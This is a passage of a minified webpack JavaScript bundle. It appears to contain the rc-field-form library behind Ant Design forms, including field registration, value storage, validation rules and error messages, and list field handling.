0===e?s.call(l(this)):s.call(l(this),r(e))}})},u9Ur:function(e,t,n){"use strict";n.d(t,"b",(function(){return je})),n.d(t,"a",(function(){return v}));var a=n("FU0I"),r=n("2EJr"),l=n("EJBU"),o=n("qPib"),i=n("3Qq0"),c=n("VGJu"),s=n("E3E7"),u=n("+g4N"),d=n("ohqK"),m=n("zraO"),p=n("+ujd"),h=n("ciTX"),g=n("ZbH0"),f="RC_FORM_INTERNAL_HOOKS",E=function(){Object(g["a"])(!1,"Can not find FormContext. Please make sure you wrap Field under Form.")},b=a["createContext"]({getFieldValue:E,getFieldsValue:E,getFieldError:E,getFieldWarning:E,getFieldsError:E,isFieldsTouched:E,isFieldTouched:E,isFieldValidating:E,isFieldsValidating:E,resetFields:E,setFields:E,setFieldValue:E,setFieldsValue:E,validateFields:E,submit:E,getInternalHooks:function(){return E(),{dispatch:E,initEntityValue:E,registerField:E,useSubscribe:E,setInitialValues:E,destroyForm:E,setCallbacks:E,registerWatch:E,getFields:E,setValidateMessages:E,setPreserve:E,getInitialValue:E}}}),v=b;function y(e){return void 0===e||null===e?[]:Array.isArray(e)?e:[e]}var k=n("ojUw"),w=n("DytP"),x=n("+/y7"),j="'${name}' is not a valid ${type}",S={default:"Validation error on field '${name}'",required:"'${name}' is required",enum:"'${name}' must be one of [${enum}]",whitespace:"'${name}' cannot be empty",date:{format:"'${name}' is invalid for format date",parse:"'${name}' could not be parsed as date",invalid:"'${name}' is invalid date"},types:{string:j,method:j,array:j,object:j,number:j,date:j,boolean:j,integer:j,float:j,regexp:j,email:j,url:j,hex:j},string:{len:"'${name}' must be exactly ${len} characters",min:"'${name}' must be at least ${min} characters",max:"'${name}' cannot be longer than ${max} characters",range:"'${name}' must be between ${min} and ${max} characters"},number:{len:"'${name}' must equal ${len}",min:"'${name}' cannot be less than ${min}",max:"'${name}' cannot be greater than ${max}",range:"'${name}' must be between ${min} and ${max}"},array:{len:"'${name}' must be exactly ${len} in length",min:"'${name}' cannot be less than ${min} in length",max:"'${name}' cannot be greater than ${max} in length",range:"'${name}' must be between ${min} and ${max} in length"},pattern:{mismatch:"'${name}' does not match pattern ${pattern}"}},C=n("nzxN");function A(e,t){for(var n=e,a=0;a<t.length;a+=1){if(null===n||void 0===n)return;n=n[t[a]]}return n}var L=n("ikCq");function T(e,t,n,a){if(!t.length)return n;var r,l=Object(L["a"])(t),o=l[0],s=l.slice(1);return r=e||"number"!==typeof o?Array.isArray(e)?Object(c["a"])(e):Object(i["a"])({},e):[],a&&void 0===n&&1===s.length?delete r[o][s[0]]:r[o]=T(r[o],s,n,a),r}function N(e,t,n){var a=arguments.length>3&&void 0!==arguments[3]&&arguments[3];return t.length&&a&&void 0===n&&!A(e,t.slice(0,-1))?e:T(e,t,n,a)}"undefined"===typeof Reflect?Object.keys:Reflect.ownKeys;function O(e){return Array.isArray(e)?P(e):"object"===Object(C["a"])(e)&&null!==e?I(e):e}function I(e){if(Object.getPrototypeOf(e)===Object.prototype){var t={};for(var n in e)t[n]=O(e[n]);return t}return e}function P(e){return e.map((function(e){return O(e)}))}var R=O;function _(e){return y(e)}function q(e,t){var n=A(e,t);return n}function M(e,t,n){var a=arguments.length>3&&void 0!==arguments[3]&&arguments[3],r=N(e,t,n,a);return r}function F(e,t){var n={};return t.forEach((function(t){var a=q(e,t);n=M(n,t,a)})),n}function D(e,t){return e&&e.some((function(e){return B(e,t)}))}function U(e){return"object"===Object(C["a"])(e)&&null!==e&&Object.getPrototypeOf(e)===Object.prototype}function z(e,t){var n=Array.isArray(e)?Object(c["a"])(e):Object(i["a"])({},e);return t?(Object.keys(t).forEach((function(e){var a=n[e],r=t[e],l=U(a)&&U(r);n[e]=l?z(a,r||{}):R(r)})),n):n}function H(e){for(var t=arguments.length,n=new Array(t>1?t-1:0),a=1;a<t;a++)n[a-1]=arguments[a];return n.reduce((function(e,t){return z(e,t)}),e)}function B(e,t){return!(!e||!t||e.length!==t.length)&&e.every((function(e,n){return t[n]===e}))}function W(e,t){if(e===t)return!0;if(!e&&t||e&&!t)return!1;if(!e||!t||"object"!==Object(C["a"])(e)||"object"!==Object(C["a"])(t))return!1;var n=Object.keys(e),a=Object.keys(t),r=new Set([].concat(n,a));return Object(c["a"])(r).every((function(n){var a=e[n],r=t[n];return"function"===typeof a&&"function"===typeof r||a===r}))}function V(e){var t=arguments.length<=1?void 0:arguments[1];return t&&t.target&&"object"===Object(C["a"])(t.target)&&e in t.target?t.target[e]:t}function $(e,t,n){var a=e.length;if(t<0||t>=a||n<0||n>=a)return e;var r=e[t],l=t-n;return l>0?[].concat(Object(c["a"])(e.slice(0,n)),[r],Object(c["a"])(e.slice(n,t)),Object(c["a"])(e.slice(t+1,a))):l<0?[].concat(Object(c["a"])(e.slice(0,t)),Object(c["a"])(e.slice(t+1,n+1)),[r],Object(c["a"])(e.slice(n+1,a))):e}var G=x["a"];function X(e,t){return e.replace(/\$\{\w+\}/g,(function(e){var n=e.slice(2,-1);return t[n]}))}var Q="CODE_LOGIC_ERROR";function K(e,t,n,a,r){return J.apply(this,arguments)}function J(){return J=Object(w["a"])(Object(k["a"])().mark((function e(t,n,r,l,s){var u,d,m,p,h,g,f,E,b;return Object(k["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return u=Object(i["a"])({},r),delete u.ruleIndex,u.validator&&(d=u.validator,u.validator=function(){try{return d.apply(void 0,arguments)}catch(e){return console.error(e),Promise.reject(Q)}}),m=null,u&&"array"===u.type&&u.defaultField&&(m=u.defaultField,delete u.defaultField),p=new G(Object(o["a"])({},t,[u])),h=H({},S,l.validateMessages),p.messages(h),g=[],e.prev=9,e.next=12,Promise.resolve(p.validate(Object(o["a"])({},t,n),Object(i["a"])({},l)));case 12:e.next=17;break;case 14:e.prev=14,e.t0=e["catch"](9),e.t0.errors&&(g=e.t0.errors.map((function(e,t){var n=e.message,r=n===Q?h["default"]:n;return a["isValidElement"](r)?a["cloneElement"](r,{key:"error_".concat(t)}):r})));case 17:if(g.length||!m){e.next=22;break}return e.next=20,Promise.all(n.map((function(e,n){return K("".concat(t,".").concat(n),e,m,l,s)})));case 20:return f=e.sent,e.abrupt("return",f.reduce((function(e,t){return[].concat(Object(c["a"])(e),Object(c["a"])(t))}),[]));case 22:return E=Object(i["a"])(Object(i["a"])({},r),{},{name:t,enum:(r["enum"]||[]).join(", ")},s),b=g.map((function(e){return"string"===typeof e?X(e,E):e})),e.abrupt("return",b);case 25:case"end":return e.stop()}}),e,null,[[9,14]])}))),J.apply(this,arguments)}function Y(e,t,n,a,r,l){var o,c=e.join("."),s=n.map((function(e,t){var n=e.validator,a=Object(i["a"])(Object(i["a"])({},e),{},{ruleIndex:t});return n&&(a.validator=function(e,t,a){var r=!1,l=function(){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];Promise.resolve().then((function(){Object(g["a"])(!r,"Your validator function has already return a promise. `callback` will be ignored."),r||a.apply(void 0,t)}))},o=n(e,t,l);r=o&&"function"===typeof o.then&&"function"===typeof o["catch"],Object(g["a"])(r,"`callback` is deprecated. Please return a promise instead."),r&&o.then((function(){a()}))["catch"]((function(e){a(e||" ")}))}),a})).sort((function(e,t){var n=e.warningOnly,a=e.ruleIndex,r=t.warningOnly,l=t.ruleIndex;return!!n===!!r?a-l:n?1:-1}));if(!0===r)o=new Promise(function(){var e=Object(w["a"])(Object(k["a"])().mark((function e(n,r){var o,i,u;return Object(k["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:o=0;case 1:if(!(o<s.length)){e.next=12;break}return i=s[o],e.next=5,K(c,t,i,a,l);case 5:if(u=e.sent,!u.length){e.next=9;break}return r([{errors:u,rule:i}]),e.abrupt("return");case 9:o+=1,e.next=1;break;case 12:n([]);case 13:case"end":return e.stop()}}),e)})));return function(t,n){return e.apply(this,arguments)}}());else{var u=s.map((function(e){return K(c,t,e,a,l).then((function(t){return{errors:t,rule:e}}))}));o=(r?te(u):Z(u)).then((function(e){return Promise.reject(e)}))}return o["catch"]((function(e){return e})),o}function Z(e){return ee.apply(this,arguments)}function ee(){return ee=Object(w["a"])(Object(k["a"])().mark((function e(t){return Object(k["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return e.abrupt("return",Promise.all(t).then((function(e){var t,n=(t=[]).concat.apply(t,Object(c["a"])(e));return n})));case 1:case"end":return e.stop()}}),e)}))),ee.apply(this,arguments)}function te(e){return ne.apply(this,arguments)}function ne(){return ne=Object(w["a"])(Object(k["a"])().mark((function e(t){var n;return Object(k["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return n=0,e.abrupt("return",new Promise((function(e){t.forEach((function(a){a.then((function(a){a.errors.length&&e([a]),n+=1,n===t.length&&e([])}))}))})));case 2:case"end":return e.stop()}}),e)}))),ne.apply(this,arguments)}var ae=["name"],re=[];function le(e,t,n,a,r,l){return"function"===typeof e?e(t,n,"source"in l?{source:l.source}:{}):a!==r}var oe=function(e){Object(m["a"])(n,e);var t=Object(p["a"])(n);function n(e){var r;if(Object(s["a"])(this,n),r=t.call(this,e),r.state={resetCount:0},r.cancelRegisterFunc=null,r.mounted=!1,r.touched=!1,r.dirty=!1,r.validatePromise=null,r.prevValidating=void 0,r.errors=re,r.warnings=re,r.cancelRegister=function(){var e=r.props,t=e.preserve,n=e.isListField,a=e.name;r.cancelRegisterFunc&&r.cancelRegisterFunc(n,t,_(a)),r.cancelRegisterFunc=null},r.getNamePath=function(){var e=r.props,t=e.name,n=e.fieldContext,a=n.prefixName,l=void 0===a?[]:a;return void 0!==t?[].concat(Object(c["a"])(l),Object(c["a"])(t)):[]},r.getRules=function(){var e=r.props,t=e.rules,n=void 0===t?[]:t,a=e.fieldContext;return n.map((function(e){return"function"===typeof e?e(a):e}))},r.refresh=function(){r.mounted&&r.setState((function(e){var t=e.resetCount;return{resetCount:t+1}}))},r.triggerMetaEvent=function(e){var t=r.props.onMetaChange;null===t||void 0===t||t(Object(i["a"])(Object(i["a"])({},r.getMeta()),{},{destroy:e}))},r.onStoreChange=function(e,t,n){var a=r.props,l=a.shouldUpdate,o=a.dependencies,i=void 0===o?[]:o,c=a.onReset,s=n.store,u=r.getNamePath(),d=r.getValue(e),m=r.getValue(s),p=t&&D(t,u);switch("valueUpdate"===n.type&&"external"===n.source&&d!==m&&(r.touched=!0,r.dirty=!0,r.validatePromise=null,r.errors=re,r.warnings=re,r.triggerMetaEvent()),n.type){case"reset":if(!t||p)return r.touched=!1,r.dirty=!1,r.validatePromise=null,r.errors=re,r.warnings=re,r.triggerMetaEvent(),null===c||void 0===c||c(),void r.refresh();break;case"remove":if(l)return void r.reRender();break;case"setField":if(p){var h=n.data;return"touched"in h&&(r.touched=h.touched),"validating"in h&&!("originRCField"in h)&&(r.validatePromise=h.validating?Promise.resolve([]):null),"errors"in h&&(r.errors=h.errors||re),"warnings"in h&&(r.warnings=h.warnings||re),r.dirty=!0,r.triggerMetaEvent(),void r.reRender()}if(l&&!u.length&&le(l,e,s,d,m,n))return void r.reRender();break;case"dependenciesUpdate":var g=i.map(_);if(g.some((function(e){return D(n.relatedFields,e)})))return void r.reRender();break;default:if(p||(!i.length||u.length||l)&&le(l,e,s,d,m,n))return void r.reRender();break}!0===l&&r.reRender()},r.validateRules=function(e){var t=r.getNamePath(),n=r.getValue(),a=Promise.resolve().then((function(){if(!r.mounted)return[];var l=r.props,o=l.validateFirst,i=void 0!==o&&o,s=l.messageVariables,u=e||{},d=u.triggerName,m=r.getRules();d&&(m=m.filter((function(e){return e})).filter((function(e){var t=e.validateTrigger;if(!t)return!0;var n=y(t);return n.includes(d)})));var p=Y(t,n,m,e,i,s);return p["catch"]((function(e){return e})).then((function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:re;if(r.validatePromise===a){var t;r.validatePromise=null;var n=[],l=[];null===(t=e.forEach)||void 0===t||t.call(e,(function(e){var t=e.rule.warningOnly,a=e.errors,r=void 0===a?re:a;t?l.push.apply(l,Object(c["a"])(r)):n.push.apply(n,Object(c["a"])(r))})),r.errors=n,r.warnings=l,r.triggerMetaEvent(),r.reRender()}})),p}));return r.validatePromise=a,r.dirty=!0,r.errors=re,r.warnings=re,r.triggerMetaEvent(),r.reRender(),a},r.isFieldValidating=function(){return!!r.validatePromise},r.isFieldTouched=function(){return r.touched},r.isFieldDirty=function(){if(r.dirty||void 0!==r.props.initialValue)return!0;var e=r.props.fieldContext,t=e.getInternalHooks(f),n=t.getInitialValue;return void 0!==n(r.getNamePath())},r.getErrors=function(){return r.errors},r.getWarnings=function(){return r.warnings},r.isListField=function(){return r.props.isListField},r.isList=function(){return r.props.isList},r.isPreserve=function(){return r.props.preserve},r.getMeta=function(){r.prevValidating=r.isFieldValidating();var e={touched:r.isFieldTouched(),validating:r.prevValidating,errors:r.errors,warnings:r.warnings,name:r.getNamePath()};return e},r.getOnlyChild=function(e){if("function"===typeof e){var t=r.getMeta();return Object(i["a"])(Object(i["a"])({},r.getOnlyChild(e(r.getControlled(),t,r.props.fieldContext))),{},{isFunction:!0})}var n=Object(h["a"])(e);return 1===n.length&&a["isValidElement"](n[0])?{child:n[0],isFunction:!1}:{child:n,isFunction:!1}},r.getValue=function(e){var t=r.props.fieldContext.getFieldsValue,n=r.getNamePath();return q(e||t(!0),n)},r.getControlled=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},t=r.props,n=t.trigger,a=t.validateTrigger,l=t.getValueFromEvent,c=t.normalize,s=t.valuePropName,u=t.getValueProps,d=t.fieldContext,m=void 0!==a?a:d.validateTrigger,p=r.getNamePath(),h=d.getInternalHooks,g=d.getFieldsValue,E=h(f),b=E.dispatch,v=r.getValue(),k=u||function(e){return Object(o["a"])({},s,e)},w=e[n],x=Object(i["a"])(Object(i["a"])({},e),k(v));x[n]=function(){var e;r.touched=!0,r.dirty=!0,r.triggerMetaEvent();for(var t=arguments.length,n=new Array(t),a=0;a<t;a++)n[a]=arguments[a];e=l?l.apply(void 0,n):V.apply(void 0,[s].concat(n)),c&&(e=c(e,v,g(!0))),b({type:"updateValue",namePath:p,value:e}),w&&w.apply(void 0,n)};var j=y(m||[]);return j.forEach((function(e){var t=x[e];x[e]=function(){t&&t.apply(void 0,arguments);var n=r.props.rules;n&&n.length&&b({type:"validateField",namePath:p,triggerName:e})}})),x},e.fieldContext){var l=e.fieldContext.getInternalHooks,u=l(f),m=u.initEntityValue;m(Object(d["a"])(r))}return r}return Object(u["a"])(n,[{key:"componentDidMount",value:function(){var e=this.props,t=e.shouldUpdate,n=e.fieldContext;if(this.mounted=!0,n){var a=n.getInternalHooks,r=a(f),l=r.registerField;this.cancelRegisterFunc=l(this)}!0===t&&this.reRender()}},{key:"componentWillUnmount",value:function(){this.cancelRegister(),this.triggerMetaEvent(!0),this.mounted=!1}},{key:"reRender",value:function(){this.mounted&&this.forceUpdate()}},{key:"render",value:function(){var e,t=this.state.resetCount,n=this.props.children,r=this.getOnlyChild(n),l=r.child,o=r.isFunction;return o?e=l:a["isValidElement"](l)?e=a["cloneElement"](l,this.getControlled(l.props)):(Object(g["a"])(!l,"`children` of Field is not validate ReactElement."),e=l),a["createElement"](a["Fragment"],{key:t},e)}}]),n}(a["Component"]);function ie(e){var t=e.name,n=Object(l["a"])(e,ae),o=a["useContext"](v),i=void 0!==t?_(t):void 0,c="keep";return n.isListField||(c="_".concat((i||[]).join("_"))),a["createElement"](oe,Object(r["a"])({key:c,name:i},n,{fieldContext:o}))}oe.contextType=v,oe.defaultProps={trigger:"onChange",valuePropName:"value"};var ce=ie,se=a["createContext"](null),ue=se,de=function(e){var t=e.name,n=e.initialValue,r=e.children,l=e.rules,o=e.validateTrigger,s=a["useContext"](v),u=a["useRef"]({keys:[],id:0}),d=u.current,m=a["useMemo"]((function(){var e=_(s.prefixName)||[];return[].concat(Object(c["a"])(e),Object(c["a"])(_(t)))}),[s.prefixName,t]),p=a["useMemo"]((function(){return Object(i["a"])(Object(i["a"])({},s),{},{prefixName:m})}),[s,m]),h=a["useMemo"]((function(){return{getKey:function(e){var t=m.length,n=e[t];return[d.keys[n],e.slice(t+1)]}}}),[m]);if("function"!==typeof r)return Object(g["a"])(!1,"Form.List only accepts function as children."),null;var f=function(e,t,n){var a=n.source;return"internal"!==a&&e!==t};return a["createElement"](ue.Provider,{value:h},a["createElement"](v.Provider,{value:p},a["createElement"](ce,{name:[],shouldUpdate:f,rules:l,validateTrigger:o,initialValue:n,isList:!0},(function(e,t){var n=e.value,a=void 0===n?[]:n,l=e.onChange,o=s.getFieldValue,i=function(){var e=o(m||[]);return e||[]},u={add:function(e,t){var n=i();t>=0&&t<=n.length?(d.keys=[].concat(Object(c["a"])(d.keys.slice(0,t)),[d.id],Object(c["a"])(d.keys.slice(t))),l([].concat(Object(c["a"])(n.slice(0,t)),[e],Object(c["a"])(n.slice(t))))):(d.keys=[].concat(Object(c["a"])(d.keys),[d.id]),l([].concat(Object(c["a"])(n),[e]))),d.id+=1},remove:function(e){var t=i(),n=new Set(Array.isArray(e)?e:[e]);n.size<=0||(d.keys=d.keys.filter((function(e,t){return!n.has(t)})),l(t.filter((function(e,t){return!n.has(t)}))))},move:function(e,t){if(e!==t){var n=i();e<0||e>=n.length||t<0||t>=n.length||(d.keys=$(d.keys,e,t),l($(n,e,t)))}}},p=a||[];return Array.isArray(p)||(p=[]),r(p.map((function(e,t){var n=d.keys[t];return void 0===n&&(d.keys[t]=d.id,n=d.keys[t],d.id+=1),{name:t,key:n,isListField:!0}})),u,t)}))))},me=de,pe=n("0YMn");function he(e){var t=!1,n=e.length,a=[];return e.length?new Promise((function(r,l){e.forEach((function(e,o){e["catch"]((function(e){return t=!0,e})).then((function(e){n-=1,a[o]=e,n>0||(t&&l(a),r(a))}))}))})):Promise.resolve([])}var ge="__@field_split__";function fe(e){return e.map((function(e){return"".concat(Object(C["a"])(e),":").concat(e)})).join(ge)}var Ee=function(){function e(){Object(s["a"])(this,e),this.kvs=new Map}return Object(u["a"])(e,[{key:"set",value:function(e,t){this.kvs.set(fe(e),t)}},{key:"get",value:function(e){return this.kvs.get(fe(e))}},{key:"update",value:function(e,t){var n=this.get(e),a=t(n);a?this.set(e,a):this["delete"](e)}},{key:"delete",value:function(e){this.kvs["delete"](fe(e))}},{key:"map",value:function(e){return Object(c["a"])(this.kvs.entries()).map((function(t){var n=Object(pe["a"])(t,2),a=n[0],r=n[1],l=a.split(ge);return e({key:l.map((function(e){var t=e.match(/^([^:]*):(.*)$/),n=Object(pe["a"])(t,3),a=n[1],r=n[2];return"number"===a?Number(r):r})),value:r})}))}},{key:"toJSON",value:function(){var e={};return this.map((function(t){var n=t.key,a=t.value;return e[n.join(".")]=a,null})),e}}]),e}(),be=Ee,ve=["name","errors"],ye=Object(u["a"])((function e(t){var n=this;Object(s["a"])(this,e),this.formHooked=!1,this.forceRootUpdate=void 0,this.subscribable=!0,this.store={},this.fieldEntities=[],this.initialValues={},this.callbacks={},this.validateMessages=null,this.preserve=null,this.lastValidatePromise=null,this.getForm=function(){return{getFieldValue:n.getFieldValue,getFieldsValue:n.getFieldsValue,getFieldError:n.getFieldError,getFieldWarning:n.getFieldWarning,getFieldsError:n.getFieldsError,isFieldsTouched:n.isFieldsTouched,isFieldTouched:n.isFieldTouched,isFieldValidating:n.isFieldValidating,isFieldsValidating:n.isFieldsValidating,resetFields:n.resetFields,setFields:n.setFields,setFieldValue:n.setFieldValue,setFieldsValue:n.setFieldsValue,validateFields:n.validateFields,submit:n.submit,_init:!0,getInternalHooks:n.getInternalHooks}},this.getInternalHooks=function(e){return e===f?(n.formHooked=!0,{dispatch:n.dispatch,initEntityValue:n.initEntityValue,registerField:n.registerField,useSubscribe:n.useSubscribe,setInitialValues:n.setInitialValues,destroyForm:n.destroyForm,setCallbacks:n.setCallbacks,setValidateMessages:n.setValidateMessages,getFields:n.getFields,setPreserve:n.setPreserve,getInitialValue:n.getInitialValue,registerWatch:n.registerWatch}):(Object(g["a"])(!1,"`getInternalHooks` is internal usage. Should not call directly."),null)},this.useSubscribe=function(e){n.subscribable=e},this.prevWithoutPreserves=null,this.setInitialValues=function(e,t){if(n.initialValues=e||{},t){var a,r=H({},e,n.store);null===(a=n.prevWithoutPreserves)||void 0===a||a.map((function(t){var n=t.key;r=M(r,n,q(e,n))})),n.prevWithoutPreserves=null,n.updateStore(r)}},this.destroyForm=function(){var e=new be;n.getFieldEntities(!0).forEach((function(t){n.isMergedPreserve(t.isPreserve())||e.set(t.getNamePath(),!0)})),n.prevWithoutPreserves=e},this.getInitialValue=function(e){var t=q(n.initialValues,e);return e.length?R(t):t},this.setCallbacks=function(e){n.callbacks=e},this.setValidateMessages=function(e){n.validateMessages=e},this.setPreserve=function(e){n.preserve=e},this.watchList=[],this.registerWatch=function(e){return n.watchList.push(e),function(){n.watchList=n.watchList.filter((function(t){return t!==e}))}},this.notifyWatch=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[];if(n.watchList.length){var t=n.getFieldsValue();n.watchList.forEach((function(n){n(t,e)}))}},this.timeoutId=null,this.warningUnhooked=function(){0},this.updateStore=function(e){n.store=e},this.getFieldEntities=function(){var e=arguments.length>0&&void 0!==arguments[0]&&arguments[0];return e?n.fieldEntities.filter((function(e){return e.getNamePath().length})):n.fieldEntities},this.getFieldsMap=function(){var e=arguments.length>0&&void 0!==arguments[0]&&arguments[0],t=new be;return n.getFieldEntities(e).forEach((function(e){var n=e.getNamePath();t.set(n,e)})),t},this.getFieldEntitiesForNamePathList=function(e){if(!e)return n.getFieldEntities(!0);var t=n.getFieldsMap(!0);return e.map((function(e){var n=_(e);return t.get(n)||{INVALIDATE_NAME_PATH:_(e)}}))},this.getFieldsValue=function(e,t){if(n.warningUnhooked(),!0===e&&!t)return n.store;var a=n.getFieldEntitiesForNamePathList(Array.isArray(e)?e:null),r=[];return a.forEach((function(n){var a,l="INVALIDATE_NAME_PATH"in n?n.INVALIDATE_NAME_PATH:n.getNamePath();if(e||!(null===(a=n.isListField)||void 0===a?void 0:a.call(n)))if(t){var o="getMeta"in n?n.getMeta():null;t(o)&&r.push(l)}else r.push(l)})),F(n.store,r.map(_))},this.getFieldValue=function(e){n.warningUnhooked();var t=_(e);return q(n.store,t)},this.getFieldsError=function(e){n.warningUnhooked();var t=n.getFieldEntitiesForNamePathList(e);return t.map((function(t,n){return t&&!("INVALIDATE_NAME_PATH"in t)?{name:t.getNamePath(),errors:t.getErrors(),warnings:t.getWarnings()}:{name:_(e[n]),errors:[],warnings:[]}}))},this.getFieldError=function(e){n.warningUnhooked();var t=_(e),a=n.getFieldsError([t])[0];return a.errors},this.getFieldWarning=function(e){n.warningUnhooked();var t=_(e),a=n.getFieldsError([t])[0];return a.warnings},this.isFieldsTouched=function(){n.warningUnhooked();for(var e=arguments.length,t=new Array(e),a=0;a<e;a++)t[a]=arguments[a];var r,l=t[0],o=t[1],i=!1;0===t.length?r=null:1===t.length?Array.isArray(l)?(r=l.map(_),i=!1):(r=null,i=l):(r=l.map(_),i=o);var s=n.getFieldEntities(!0),u=function(e){return e.isFieldTouched()};if(!r)return i?s.every(u):s.some(u);var d=new be;r.forEach((function(e){d.set(e,[])})),s.forEach((function(e){var t=e.getNamePath();r.forEach((function(n){n.every((function(e,n){return t[n]===e}))&&d.update(n,(function(t){return[].concat(Object(c["a"])(t),[e])}))}))}));var m=function(e){return e.some(u)},p=d.map((function(e){var t=e.value;return t}));return i?p.every(m):p.some(m)},this.isFieldTouched=function(e){return n.warningUnhooked(),n.isFieldsTouched([e])},this.isFieldsValidating=function(e){n.warningUnhooked();var t=n.getFieldEntities();if(!e)return t.some((function(e){return e.isFieldValidating()}));var a=e.map(_);return t.some((function(e){var t=e.getNamePath();return D(a,t)&&e.isFieldValidating()}))},this.isFieldValidating=function(e){return n.warningUnhooked(),n.isFieldsValidating([e])},this.resetWithFieldInitialValue=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},t=new be,a=n.getFieldEntities(!0);a.forEach((function(e){var n=e.props.initialValue,a=e.getNamePath();if(void 0!==n){var r=t.get(a)||new Set;r.add({entity:e,value:n}),t.set(a,r)}}));var r,l=function(a){a.forEach((function(a){var r=a.props.initialValue;if(void 0!==r){var l=a.getNamePath(),o=n.getInitialValue(l);if(void 0!==o)Object(g["a"])(!1,"Form already set 'initialValues' with path '".concat(l.join("."),"'. Field can not overwrite it."));else{var i=t.get(l);if(i&&i.size>1)Object(g["a"])(!1,"Multiple Field with path '".concat(l.join("."),"' set 'initialValue'. Can not decide which one to pick."));else if(i){var s=n.getFieldValue(l);e.skipExist&&void 0!==s||n.updateStore(M(n.store,l,Object(c["a"])(i)[0].value))}}}}))};e.entities?r=e.entities:e.namePathList?(r=[],e.namePathList.forEach((function(e){var n,a=t.get(e);a&&(n=r).push.apply(n,Object(c["a"])(Object(c["a"])(a).map((function(e){return e.entity}))))}))):r=a,l(r)},this.resetFields=function(e){n.warningUnhooked();var t=n.store;if(!e)return n.updateStore(H({},n.initialValues)),n.resetWithFieldInitialValue(),n.notifyObservers(t,null,{type:"reset"}),void n.notifyWatch();var a=e.map(_);a.forEach((function(e){var t=n.getInitialValue(e);n.updateStore(M(n.store,e,t))})),n.resetWithFieldInitialValue({namePathList:a}),n.notifyObservers(t,a,{type:"reset"}),n.notifyWatch(a)},this.setFields=function(e){n.warningUnhooked();var t=n.store,a=[];e.forEach((function(e){var r=e.name,o=(e.errors,Object(l["a"])(e,ve)),i=_(r);a.push(i),"value"in o&&n.updateStore(M(n.store,i,o.value)),n.notifyObservers(t,[i],{type:"setField",data:e})})),n.notifyWatch(a)},this.getFields=function(){var e=n.getFieldEntities(!0),t=e.map((function(e){var t=e.getNamePath(),a=e.getMeta(),r=Object(i["a"])(Object(i["a"])({},a),{},{name:t,value:n.getFieldValue(t)});return Object.defineProperty(r,"originRCField",{value:!0}),r}));return t},this.initEntityValue=function(e){var t=e.props.initialValue;if(void 0!==t){var a=e.getNamePath(),r=q(n.store,a);void 0===r&&n.updateStore(M(n.store,a,t))}},this.isMergedPreserve=function(e){var t=void 0!==e?e:n.preserve;return null===t||void 0===t||t},this.registerField=function(e){n.fieldEntities.push(e);var t=e.getNamePath();if(n.notifyWatch([t]),void 0!==e.props.initialValue){var a=n.store;n.resetWithFieldInitialValue({entities:[e],skipExist:!0}),n.notifyObservers(a,[e.getNamePath()],{type:"valueUpdate",source:"internal"})}return function(a,r){var l=arguments.length>2&&void 0!==arguments[2]?arguments[2]:[];if(n.fieldEntities=n.fieldEntities.filter((function(t){return t!==e})),!n.isMergedPreserve(r)&&(!a||l.length>1)){var o=a?void 0:n.getInitialValue(t);if(t.length&&n.getFieldValue(t)!==o&&n.fieldEntities.every((function(e){return!B(e.getNamePath(),t)}))){var i=n.store;n.updateStore(M(i,t,o,!0)),n.notifyObservers(i,[t],{type:"remove"}),n.triggerDependenciesUpdate(i,t)}}n.notifyWatch([t])}},this.dispatch=function(e){switch(e.type){case"updateValue":var t=e.namePath,a=e.value;n.updateValue(t,a);break;case"validateField":var r=e.namePath,l=e.triggerName;n.validateFields([r],{triggerName:l});break;default:}},this.notifyObservers=function(e,t,a){if(n.subscribable){var r=Object(i["a"])(Object(i["a"])({},a),{},{store:n.getFieldsValue(!0)});n.getFieldEntities().forEach((function(n){var a=n.onStoreChange;a(e,t,r)}))}else n.forceRootUpdate()},this.triggerDependenciesUpdate=function(e,t){var a=n.getDependencyChildrenFields(t);return a.length&&n.validateFields(a),n.notifyObservers(e,a,{type:"dependenciesUpdate",relatedFields:[t].concat(Object(c["a"])(a))}),a},this.updateValue=function(e,t){var a=_(e),r=n.store;n.updateStore(M(n.store,a,t)),n.notifyObservers(r,[a],{type:"valueUpdate",source:"internal"}),n.notifyWatch([a]);var l=n.triggerDependenciesUpdate(r,a),o=n.callbacks.onValuesChange;if(o){var i=F(n.store,[a]);o(i,n.getFieldsValue())}n.triggerOnFieldsChange([a].concat(Object(c["a"])(l)))},this.setFieldsValue=function(e){n.warningUnhooked();var t=n.store;if(e){var a=H(n.store,e);n.updateStore(a)}n.notifyObservers(t,null,{type:"valueUpdate",source:"external"}),n.notifyWatch()},this.setFieldValue=function(e,t){n.setFields([{name:e,value:t}])},this.getDependencyChildrenFields=function(e){var t=new Set,a=[],r=new be;n.getFieldEntities().forEach((function(e){var t=e.props.dependencies;(t||[]).forEach((function(t){var n=_(t);r.update(n,(function(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:new Set;return t.add(e),t}))}))}));var l=function e(n){var l=r.get(n)||new Set;l.forEach((function(n){if(!t.has(n)){t.add(n);var r=n.getNamePath();n.isFieldDirty()&&r.length&&(a.push(r),e(r))}}))};return l(e),a},this.triggerOnFieldsChange=function(e,t){var a=n.callbacks.onFieldsChange;if(a){var r=n.getFields();if(t){var l=new be;t.forEach((function(e){var t=e.name,n=e.errors;l.set(t,n)})),r.forEach((function(e){e.errors=l.get(e.name)||e.errors}))}var o=r.filter((function(t){var n=t.name;return D(e,n)}));a(o,r)}},this.validateFields=function(e,t){n.warningUnhooked();var a=!!e,r=a?e.map(_):[],l=[];n.getFieldEntities(!0).forEach((function(o){if(a||r.push(o.getNamePath()),(null===t||void 0===t?void 0:t.recursive)&&a){var s=o.getNamePath();s.every((function(t,n){return e[n]===t||void 0===e[n]}))&&r.push(s)}if(o.props.rules&&o.props.rules.length){var u=o.getNamePath();if(!a||D(r,u)){var d=o.validateRules(Object(i["a"])({validateMessages:Object(i["a"])(Object(i["a"])({},S),n.validateMessages)},t));l.push(d.then((function(){return{name:u,errors:[],warnings:[]}}))["catch"]((function(e){var t,n=[],a=[];return null===(t=e.forEach)||void 0===t||t.call(e,(function(e){var 